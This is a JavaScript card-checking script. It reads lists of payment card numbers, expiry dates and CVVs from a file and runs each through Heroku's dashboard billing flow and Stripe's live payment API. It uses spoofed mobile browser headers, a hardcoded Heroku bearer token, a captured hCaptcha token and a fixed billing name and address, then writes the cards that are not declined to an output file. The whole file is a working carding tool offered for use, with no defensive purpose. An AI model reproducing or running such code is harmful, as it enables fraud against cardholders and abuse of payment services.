import fs from 'fs'
const headers = {
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'Accept': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://js.stripe.com/',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Priority': 'u=1, i'
}
const get = async (url,body,type)=>{
    const response = await fetch(url, {
        method: type,
        headers: {
            'Host': 'api.stripe.com',
            'Content-Length': body.length,
           ...headers
        },
        body: body
    });
    return {data: response.json()};
}

const getToken = async () => {
    const res = await fetch('https://api.heroku.com/account/payment-method/client-token', {
        method: 'POST',
        headers: {
            'Host': 'api.heroku.com',
            'Content-Length': '0',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'x-origin': 'https://dashboard.heroku.com',
            'x-heroku-requester': 'dashboard',
            'sec-ch-ua-mobile': '?1',
            'Authorization': 'Bearer HRKU-a39de1d5-5577-49d0-83fc-ed8d9fe1034c',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/vnd.heroku+json; version=3',
            'sec-ch-ua-platform': '"Android"',
            'Origin': 'https://dashboard.heroku.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://dashboard.heroku.com/',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Priority': 'u=1, i'
        }
    })
    const data = await res.json();
  
    return data

}
const paymentMethod = async (number,cvv, month ,year) => {
 const body =  `type=card&billing_details[name]=Muhammad+Talha&billing_details[address][city]=Islamabad&billing_details[address][country]=PK&billing_details[address][line1]=Shah+dara+Rd.&billing_details[address][postal_code]=41093&billing_details[address][state]=Islamabad+capital+territory&card[number]=${number}&card[cvc]=${cvv}&card[exp_month]=${month}&card[exp_year]=${year}&guid=f2d64b3a-9175-4658-802d-98e682aa92c7780e6f&muid=7d67fa09-d794-46ed-aad5-74770c5ecf0fd6fe9d&sid=d066e82c-2ef1-475a-a893-ddf78b11cb0e608711&pasted_fields=number&payment_user_agent=stripe.js%2Fafaafa4bc4%3B+stripe-js-v3%2Fafaafa4bc4%3B+split-card-element&referrer=https%3A%2F%2Fdashboard.heroku.com&time_on_page=620037&key=pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiQUFYNEQrc3Q1ZFkvYUJSV2tiQTYvYy8wTWxVL255Vi9sajUwMVJxQTI3NndBQjBQaXo0UkxEdjNveEJDTTU5VWhEVjVpMFA5QjV3OXJjSHI5WnE5OG44a3dVOFFJTThzR1hodWZMQ2sxZittZjRxQTh3K0NUU0ZMYXZnbFJMSkFtdDNYd2ZEalVyR2liMW5wa1htZytsaHdJdkJEay9pcVR0NkNzT3BtQTYzZHQ1ZEVWa1p6Nmwzb1ZPRk9URFg5WXoyTHZvV3NabWZkdFJMakx5M1F4M2EwbHdXUjRpdUo3UTV2ZlJnZWdCSHV4NVNVMkE3TzFOR016K1M5aGE2bncvNEJFcFNKOTNadTFDbTJhTXdScm1PeUIwZ0RxVGVSYW9hNzNWUXVJcG1UMU1hMklLaDU5V3VGVW14OS9OS3NyZTZ3dGswSkZJUmgzSXNMcFFMcjFWdk4vRk5lTVhvNTY4cDJLTEZZTDBQdjlvdkttTGcyd0JCbFdBcXFOQzJSTXJ3MS9EN2JlNVZNQ2V6MkJDWVVGZkNBamlYNWVxVVRiNlVVS21jbTVuZWdGa1A0NHNmSFE4TE96N01MbVdyenNQYjFiWjRJM3FJaFJlazlJU0hJVjBIa0dzVGZUSk5zajdIK2pJeWhJM1FvUnVPcTVFNTY0c2p6RUxOOUNhWERwWXZNall5Tlc2cVpXUldNb0Nvd1NTWWxWT2NmOTJFUmlWeGhOR2g2ZzA5b3ZKbllJWllRcmh5ODJWdTJlbTAzUWM2OFUvUDlJVFRwSWdHUTYycUlrTksyUjAzWHVMbTBFc3VSeGlFV3JmWlE5QlNwZE80Q3hQMUloTTh2Ri9pMnVybDlLMXdJS3JQenMrckZ6RSt6ZGlhN2FMek56Q0lRZWtXTXJvV25JNDEyN2ttaDUweHc0WHhQNzNKTC9FemFZem1TVXQvZEE1c1JKMVIrSm0rL3lVY0hlcU1NWmRtMGlZcDBJR29PY3R5WTlyWTNsRUxwSEl3SkwxNFZmOEZkYkFrNWVMNHlQOGIwV0R6ZEwvK2dIS3RFbWxaMjBPSlpLR3VvbUpTWjYwVnlZamxRNFhtOE1ka284Ym5Ob1BRMExpMGtNNk5tSEI3VDZTeTg4L0RkYXVYQkphK1F2RlZMeW8vRWkwTGlBZ0ZqeVZDUmU1THZZcVYyR3JBdjRRdjEyRVRzN0JKNGZlWU5Ob3VERlVnaXBPZnJpblRXaHlYRU93bm9GaEVBQW1sRnRaakl6amVnVDFVRU5UbE5YdDRuYUhSWWN0bnh4Rkg1aHowbW1YanVLbzZpUENid0swbGVZekJwR2RVblN3MGNQL3JWMjN1STJiQmtWSlRFVVhXRnh5Y1l3aFg5ZkFTMElTTzh0K2ErSjV3VnY5L0pBUDZybGRXamprV01KaHBHMFpOQThuOVQxZzR5QzV1VDNVY3NjbUtjVGRSVktSb1RMUWk4d1BjeENOaEQyMmkvMm9zZkpIaFUrZlpKN2ltbFFROUE3dUZCZEtSMDVsb0dueEEzVm90QTgwd1dqTno1WXJwOURnaWtsTENvMEJSL2FwbGFkaDFFS2RUR2FoeWVNanAyalJHRHVCOGNGc2JaSDlTSGdnNzBLS1p6WDBHZjY0ZVIzYzhZTGZIYUE5U2tDOHV5YjhtQWN6Uzg0Q2dVQTEwQUZIWFdVenhEcnh1SStoSlVsNE1GU201TWMyUm9wTGs0U0dEZnkxWTRWRjdxYUhMdVE1ZWh5VGVVM3VmbzBHNzB0V1hOWWdUWHBucGxpbDdrVHZYYzZFR0dPeGRweVI3U0JMNHJvUi9ZY2FZV0FPNjQvM3hNQXRYNkZEb1NKc2pBUlVVV1hablNteU9sL0UyUVk3NTA5SDI2SUR2VUQ5UXhNeHVzQWUrd0lBNVhVNUVVMXUyTGtNYmF6V3JoUUtGVjhodHIyTC9VL2xVZkRTSnloU01wK0huZGc5b3Q4bExYWmxaYnlxOWwrOVBHSFh0MnFreXNkaG9ua3lwUFJsK1NXa1pYUFZqaE1vRVJYYS9oREpaa3hCSEF3WDBGQnF2VlZ2ZGlqZDFTbE5DeTBJS1hwaTF0UmczYm5DSUt1ZEp0Ty8wU1dNbDl0WGxvV3FZNlVqc0duNHAzbVNZQ3AzeEJnand0OTdXUi9ZV1VGQzkyRStXUHZhUUlsTkUwS01KOEYyTTliOHEwMFlUM1p0ajRpSDhVZzhpaGNTZWNwS3Qzekh0NWNQMDhNQ2VtTDREMkZ1Y3U4SXJPSU1wZDJVMjdwZU51a3FndjhKWUo3MzQzMGZmQlhRamJ2NDBuUzBoRDZ5d2dGRUs0TVhZRldWcjFoQkplQWZJWmhOaDFBalllZG5Td0tJVzd5ZEpMTndaZmdHY1hhUlh6ekZLc0xaQ3hqQlFVUFNuayt4czJVODRqS0lVS0ZqS3pxQy94VEdsN2g5QThQNkMrNEpWWEs0emRGL0JURlF2Ymlzdno2cm1meHhzUzM2eWhhKzdWSU9WVE5XTGx1TlNzRFpjSml1OWx4Nmk3MDN3dzlrSDRuTDJPUVZkU3BmVnhETExEcTZ5aDRyMGpuQ3FtRzJLQWs2azMvZ0tRRjZrZTdtczdlbXRYOCt4RnhlYnpnK0c4MitqY1VsaUZRUkxsZC9SVTkwbXNuc0hqbEFKQzdMeUQ2NU5IUkNBWHFjUlFPNTUwOUQ1MEhXQ0MrN1pCRnhtWVJRcDFnR1UwcHpMQ013Zyt2cGM9IiwiZXhwIjoxNzI2MzU3MzUwLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiNDlkYjU1NyIsInBkIjowLCJjZGF0YSI6ImluSXZMTGNQb1djSDl6YVEyQ0crTmhwSVVoT2ZNM3BtdVlwajhDU1NFOEdMY2V3dU51WWJvaU5PRGJVQlNzbCt0aEU5OG45U0FLeWFJMHBGQUMyOXBOdVRUMWdSMlE2WU1Hc05wNVBXc05ZY25ML1BwOHU1SUtkWldOb2dMREJCZlpkaWs1N2E4cys3WVdGOW9nalRYaFJDNEpRNHpCNlg4ellCRHk1UElHUjdBaFVJQnJkZUlzWm9uTVVRZnp5VnJ4YVVSRHpYa0FEMmlDcGgifQ.Ndr2EgOSHywRvQZYZquHmSQSz_n8wAVM-pyHbvAfsPI`
  
    const res = await fetch('https://api.stripe.com/v1/payment_methods', {
        method: 'POST',
        headers: {
            'Host': 'api.stripe.com',
            'Content-Length': body.length,
           ...headers
        },
        body:body
    })

    const data = await res.json();
    return data
   
}

const paymentIntent = async (pm_id,token) => {
     
    const res = await fetch(`https://api.stripe.com/v1/payment_intents/${token.split('_secret_')[0]}/confirm`, {
        method: 'POST',
        headers: {
          'Host': 'api.stripe.com',
          'Content-Length': '283',
          'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
          'Accept': 'application/json',
          'sec-ch-ua-platform': '"Android"',
          'sec-ch-ua-mobile': '?1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://js.stripe.com',
          'Sec-Fetch-Site': 'same-site',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Dest': 'empty',
          'Referer': 'https://js.stripe.com/',
          'Accept-Encoding': 'gzip, deflate, br, zstd',
          'Accept-Language': 'en-US,en;q=0.9',
          'Priority': 'u=1, i'
        },
        body:`payment_method=${pm_id}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn&client_secret=${token}`
      })
    const data = await res.json();
    
    return data

}

const finalIntent = async (token) => {
    const res = await fetch(`https://api.stripe.com/v1/payment_intents/${token.split('_secret_')[0]}?key=pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn&is_stripe_sdk=false&client_secret=${token}`, {
        method: 'GET',
        headers: {
            'Host': 'api.stripe.com',
            ...headers
        }
    })
    const data = await res.json();
    return data;
}

const checkAuth = async (number,cvv,month,year)=>{
    try {
        const {token} = await getToken()
        const {id} = await paymentMethod(number,cvv,month,year)
        const payment_Intent = await paymentIntent(id,token)
        if(payment_Intent?.error?.code=='card_declined'){
         return {err:true,msg:'Card Declined'} 
       }
       else if(payment_Intent?.error?.code=='incorrect_number'){
         return {err:true,msg:'Incorrect Card Number'}
       }
       
      return {err:false, card:`${number}|${month}|20${year}|${cvv}`,status:payment_Intent.status}
    } catch (error) {
        return {error}
    }
}




const check = async (data)=>{
const payments = data.split('\n').map(i=>i.split('|'))
const arr= []
for(let i =0; i<payments.length;i++){
    console.log(payments[i])
   const res = await checkAuth(payments[i][0],payments[i][3].split('\r').join(''),payments[i][1],payments[i][2]?.slice(2))
   console.log(res)
   if(!res.err){
    console.log(res.card)
    arr.push(res.card)
   }
}
 return arr
}

const data = fs.readFileSync('input.txt','utf8')
check(data).then(res=>fs.writeFileSync('output.txt',res.join('\n')))
